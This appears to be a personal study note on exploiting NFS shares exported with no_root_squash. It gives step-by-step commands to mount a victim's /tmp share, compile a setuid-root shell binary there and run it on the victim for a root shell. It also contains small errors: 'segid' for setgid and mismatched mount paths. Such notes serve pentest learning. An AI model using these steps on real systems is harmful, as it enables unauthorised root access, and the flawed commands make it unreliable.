The `NFS Root Squashing` it's a security mechanism in the `NFS protocol (Network file system)` in order to prevent that a user with root access on the client `NFS` uses them on the `NFS` server to escalate on it.


When the `root squashing` is not well configured or disabled then a user with `root` access on a client `NFS` can escalate and access to privileged files into the `server NFS`.


# Root squashing identification

<mark style="background: #BBFABBA6;">To understand if our host has the root squashing configured we can use:</mark>
```bash
cat /etc/exports
```
- ![[Pasted image 20250118162401.png]]

We can see that `/tmp` has `no_root_squash`:
- this means that the folder is sharable and can be mounted


So we can mount the folder `/tmp`

# Mounting the folder
On the attacker machine we can use:
```bash
showmount -e VICTIM_IP
```
- ![[Pasted image 20250118162543.png]]

So at this point on the attacker we mount it on our host:
```bash
mkdir /tmp/mountme

mount -o rw,vers=2 VICTIM_IP:/tmp /tmp/mount
```
- ![[Pasted image 20250118162650.png]]


> NOTE: WE MUST BE ROOT ON THE ATTACKER MACHINE
# Malicious file creation
Now we create a malicious file:
```bash
echo 'int main() { segid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/shell.c
```


We created a file, we can see it using:
```bash 
cat /tmp/mountme/shell.c
```
- ![[Pasted image 20250118162912.png]]



Now we need to compile it:
```bash
gcc /tmp/mountme/shell.c -o /tmp/mountme/shell
```


We give the execution permission (`SUID`) to it:
```bash
chmod +s /tmp/mountme/shell
```
- this gives the possibility to run the file as root with `+s`
- THIS IS THE IMPORTANT PART


# Executing on victim
Now we go on the victim host and we execute the file:
```bash
cd /tmp

./shell
```
- ![[Pasted image 20250118163227.png]]


<mark style="background: #BBFABBA6;">We gain the root shell!</mark>


# When it can be done
1. When we have the `not_root_squashing`
	1. This because in that case everything we do remotely on the folder is done as `root` (BUT ONLY IF WE ARE ROOT ON THE ATTACKER MACHINE)
	2. ![[Pasted image 20250118163453.png]]
		1. The file is owned by `root`
	3. This because `NFS` doesn't convert the `root` user into a normal one with this configuration
2. When the attacker can mount the shared folder

